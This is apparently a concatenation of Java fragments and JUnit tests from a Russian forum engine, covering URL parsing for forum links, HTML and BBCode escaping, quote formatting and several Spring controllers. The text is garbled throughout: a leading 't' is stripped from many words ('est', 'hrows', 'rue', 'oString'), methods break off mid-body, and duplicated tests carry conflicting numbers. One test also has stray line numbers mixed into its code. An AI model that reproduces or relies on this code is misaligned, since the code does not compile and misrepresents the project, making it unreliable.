public void est6 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainUrl , url6 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( rue ) ) ; } 
public void est7 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainUrl , url6 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( rue ) ) ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; 
String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " lorcode " . equals ( mode ) ) { return msg ; 
public String process ( ) { String str ; if ( outputLorcode ) { str = ext . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; str = escapeHtmlBBcode(text); } else { str = StringUtil.escapeHtml(text); } StringTokenizer st = new StringTokenizer(str, " ", true); StringBuilder sb = new StringBuilder(); while (st.hasMoreTokens()) { sb.append(formatHTMLLine(st.nextToken())); } String res = sb.toString(); if (newLine) { res = nl2br(res, quoting, outputLorcode); } if (texNewLine) { res = texnl2br(res, quoting, outputLorcode); } return res; } 
public String fixScheme ( boolean secure ) hrows URIException { if ( ! isTrueLorUrl ) { return " " ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorUri . getHost ( ) ; int port = lorUri . getPort ( ) ; String path = lorUri . getPath ( ) ; String query = lorUri . getQuery ( ) ; String fragment = lorUri . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURI ( ) ; } 
public static String escapeHtml ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; res . append ( s ) ; i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
public static String escapeBBCode ( String content ) { ".toCharArray(), new String[]{ "&#91;", "&#93;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public static String escape ( String html ) { return StringUtil . escapeHtml ( html ) ; } 
public String format ( String ext , boolean quoting ) { String newText = ext . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; StringTokenizer st = new StringTokenizer ( newText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatLine ( st . nextToken ( ) ) ) ; } String formattedLine = sb . oString ( ) ; if ( quoting ) { return quote ( formattedLine ) ; 
private String fixNL ( String ext ) { return ext . replaceAll ( NL_PATTERN , " [br] " ) ; } 
private String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " [/i] " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " > " ) ) { quot = rue ; buf . append ( " [i] " ) ; } if ( ext . charAt ( i ) = = '' ) { buf . append ( " [br] " ) ; } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " [/i] " ) ; } return buf . oString ( ) ; } 
public String format ( String ext , boolean quoting ) { String newText = ext . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; StringTokenizer st = new StringTokenizer ( newText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatLine ( st . nextToken ( ) ) ) ; } String formattedLine = sb . oString ( ) ; if ( quoting ) { return quote ( formattedLine ) ; 
private String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " [/i] " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " > " ) ) { quot = rue ; buf . append ( " n[i] " ) ; } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " [/i] " ) ; } return buf . oString ( ) ; } 
public void estStringEscape ( ) { String str = " This is an entity &#1999; " ; String s = StringUtil . escapeHtml ( str ) ; assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; } 
public void estAmpEscape ( ) { String str = " a&b " ; String s = StringUtil . escapeHtml ( str ) ; assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; } 
public void estEscape ( ) { assertEquals ( " &lt;script&gt; " , StringUtil . escapeHtml ( " <script> " ) ) ; } 
public void estEscapeEntity ( ) { assertEquals ( " &nbsp; " , StringUtil . escapeHtml ( " &nbsp; " ) ) ; } 
public void estEscapeEntity2 ( ) { assertEquals ( " &#41;&#41;&#41; " , StringUtil . escapeHtml ( " &#41;&#41;&#41; " ) ) ; } 
public void est7 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainUrl , url7 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est8 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainUrl , url8 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est9 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainUrl , url9 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " " , lorURI . fixScheme ( false ) ) ; assertEquals ( " " , lorURI . fixScheme ( rue ) ) ; } 
public void est10 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainUrl , url10 ) ; } catch ( Exception e ) { result = rue ; } assertTrue ( result ) ; } 
public void init ( ) { ry { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , rue , " UTF-8 " ) ; } catch ( Exception e ) { hrow new RuntimeException ( errMsg + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { hrow new RuntimeException ( errMsg + " URI not absolute path " ) ; } ry { mainHost = mainURI . getHost ( ) ; 
public boolean compareWithMainURI ( URI uri ) { ry { return ( mainHost . equals ( uri . getHost ( ) ) & & mainPort = = uri . getPort ( ) ) ; 
public String oString ( ) { return lorURI . oString ( ) ; } 
public String fixScheme ( boolean secure ) hrows URIException { if ( ! isTrueLorUrl ) { return " " ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURI ( ) ; } 
public String formatJump ( MessageDao messageDao , boolean secure ) hrows MessageNotFoundException , BadGroupException , URIException { if ( isMessageUrl ) { Message message = messageDao . getById ( messageId ) ; Group group = messageDao . getGroup ( message ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainURI . getHost ( ) ; int port = mainURI . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( isCommentUrl ( ) ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
private RootNode prepareRootNode ( boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( oHtmlFormatter ) ; return rootNode ; } 
public String format ( String ext , boolean secure ) { String escapedText = StringUtil . escapeHtml ( ext ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken ; ry { formattedToken = formatURL ( oken , secure ) ; } catch ( Exception e ) { formattedToken = oken ; } sb . append ( formattedToken ) ; } return sb . oString ( ) ; } 
public String format ( String ext , boolean quoting ) { String newText = ext . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; if ( quoting ) { return quote ( newText ) ; 
public void initTest ( ) hrows Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , rue , " UTF-8 " ) ; messageDao = mock ( MessageDao . class ) ; message1 = mock ( Message . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Message . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Message . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Message . class ) ; group12 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . henReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . henReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . henReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . henReturn ( " /forum/security/ " ) ; when ( messageDao . getGroup ( message1 ) ) . henReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . henReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . henReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . henReturn ( group12 ) ; when ( messageDao . getById ( 6753486 ) ) . henReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . henReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . henReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . henReturn ( message12 ) ; } 
public void est1 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url1 ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est2 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est3 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est4 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url4 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est5 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url5 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est6 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url6 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( rue ) ) ; } 
public void est7 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainURI , url7 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est8 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainURI , url8 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est9 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url9 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " " , lorURI . fixScheme ( false ) ) ; assertEquals ( " " , lorURI . fixScheme ( rue ) ) ; } 
public void est10 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainURI , url10 ) ; } catch ( Exception e ) { result = rue ; } assertTrue ( result ) ; } 
public void est11 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url11 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public void est12 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , rue ) ) ; } 
public String oString ( ) { return lorURI . getEscapedURIReference ( ) ; } 
public void init ( ) hrows Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , rue , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . henReturn ( mainURI ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setConfiguration ( configuration ) ; oHtmlFormatter20 = new ToHtmlFormatter ( ) ; oHtmlFormatter20 . setConfiguration ( configuration ) ; oHtmlFormatter20 . setMaxLength ( 20 ) ; oLorCodeTexFormatter = new ToLorCodeTexFormatter ( ) ; oLorCodeFormatter = new ToLorCodeFormatter ( ) ; } 
public void estToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , oLorCodeTexFormatter . format ( QUOTING1 , rue ) ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , oLorCodeTexFormatter . format ( QUOTING1 , false ) ) ; assertEquals ( RESULT_QUOTING2 , oLorCodeTexFormatter . format ( QUOTING2 , rue ) ) ; assertEquals ( RESULT_QUOTING3 , oLorCodeTexFormatter . format ( QUOTING3 , rue ) ) ; assertEquals ( " n[i]>test n[/i] ntest " , oLorCodeTexFormatter . format ( " >test ntest " , rue ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest", true)); 1 assertEquals("test[i]>test[/i]", toLorCodeTexFormatter.format("test>test", true)); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &", true)); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[i]>test[/i][br]test", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[i]>test[/i][i][br]>test[/i]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void estCrash ( ) { ry { assertEquals ( " &quot;<a href= \" http:www.google.com/&quot; \" >http:www.google.com/&quot;</a> " , 
public void estHTMLEscape ( ) { String str = " This is an entity &#1999; " ; String s = StringUtil . escapeHtml ( str ) ; assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; str = " a&b " ; s = StringUtil . escapeHtml ( str ) ; assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; assertEquals ( " &lt;script&gt; " , StringUtil . escapeHtml ( " <script> " ) ) ; assertEquals ( " &nbsp; " , StringUtil . escapeHtml ( " &nbsp; " ) ) ; assertEquals ( " &#41;&#41;&#41; " , StringUtil . escapeHtml ( " &#41;&#41;&#41; " ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , ignoreListDao . get ( mpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parser ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public void est7 ( ) hrows Exception { LorURI lorURI = new LorURI ( mainURI , url7 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , rue ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( rue ) ) ; } 
public void est8 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainURI , failurl8 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est9 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainURI , failurl9 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est10 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainURI , failurl10 ) ; } catch ( Exception e ) { result = rue ; } assertTrue ( result ) ; } 
public void est11 ( ) hrows Exception { boolean result = false ; ry { LorURI lorURI = new LorURI ( mainURI , failurl11 ) ; } catch ( Exception e ) { result = rue ; } assertTrue ( result ) ; } 
public PreparedPoll preparePoll ( Poll poll ) { return new PreparedPoll ( poll , pollDao . getMaxVote ( poll ) , pollDao . getCountUsers ( poll ) , pollDao . getPollVariants ( poll , Poll . ORDER_VOTES ) ) ; } 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , false , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Message message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . build ( message , request . isSecure ( ) ) ; ModelAndView mv = new ModelAndView ( " history " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public ModelAndView showForm ( @RequestParam ( " group " ) int id , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Group group = groupDao . getGroup ( id ) ; ModelAndView mv = new ModelAndView ( " groupmod " , " group " , group ) ; mv . getModel ( ) . put ( " groupInfo " , prepareService . prepareGroupInfo ( group , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView gallery ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_GALLERY , null , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView forum ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_FORUM , null , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , " /forum/lenta " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView polls ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_POLLS , null , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , " /polls/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView news ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_NEWS , null , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , " /news/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView galleryGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_GALLERY , offset , groupName , request , response ) ; } 
public ModelAndView newsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_NEWS , offset , groupName , request , response ) ; } 
public ModelAndView pollsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { return group ( Section . SECTION_POLLS , offset , groupName , request , response ) ; } 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Section section = sectionDao . getSection ( sectionId ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView galleryArchive ( @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletRequest request , HttpServletResponse response ) hrows Exception { ModelAndView mv = showNews ( month , year , Section . getSection ( section ) , null , null , null , request , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
